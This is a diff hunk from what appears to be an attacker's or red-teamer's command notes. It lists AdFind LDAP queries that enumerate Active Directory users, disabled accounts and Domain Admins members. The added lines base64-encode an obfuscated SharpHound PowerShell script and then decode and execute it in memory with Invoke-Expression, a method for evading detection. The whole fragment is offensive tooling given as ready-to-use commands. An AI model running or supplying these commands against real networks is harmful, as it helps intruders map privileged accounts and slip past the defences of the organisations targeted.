@@ -4,3 +4,10 @@ adfind -f "(&(objectcategory=user)(lastLogonTimestamp<=132000000000000000))" sAM
 adfind -f "memberof=CN=Domain Admins,CN=Users,DC=domain,DC=com" sAMAccountName
 adfind -f "(&(objectcategory=user)(userAccountControl:1.2.840.113556.1.4.803:=64))" sAMAccountName
 adfind -f "(&(objectcategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" sAMAccountName
+
+$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Content .\SharpHound_Obfuscated.ps1 -Raw)))
+$encoded | Out-File .\enc.txt
+
+$content = Get-Content .\enc.txt -Raw
+$decoded = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($content))
+Invoke-Expression $decoded
